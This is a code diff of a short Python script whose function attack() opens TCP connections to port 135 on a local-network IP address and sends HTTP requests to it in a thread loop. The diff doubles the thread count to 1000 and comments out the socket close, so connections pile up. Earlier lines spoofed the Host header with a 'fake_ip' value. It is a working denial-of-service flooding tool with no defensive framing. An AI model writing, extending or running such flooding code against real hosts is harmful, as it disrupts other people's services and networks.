@@ -1,7 +1,7 @@
 import socket
 import threading
 
-target = "192.168.1.11" # The target IP address to scan for open ports.
+target = "192.168.1.15" # The target IP address to scan for open ports.
 port = 135
 # i = 1
 fake_ip = "182.21.20.32"
@@ -11,9 +11,9 @@ def attack():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((target,port))
-            sock.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"),(target,port))
-            sock.sendto(("HOST: " + fake_ip + " \r\n\r\n").encode("ascii"),(target,port))
-            sock.close()
+            request = "GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"
+            sock.sendall(request.encode("ascii"))
+            # sock.close()
             
             global already_connected 
             already_connected = already_connected + 1
@@ -23,7 +23,7 @@ def attack():
         except:
             print("Disconnected!!!")           
 
-size = 500
+size = 1000
 thread_list = []
 for i in range(size):
     thread = threading.Thread(target=attack)
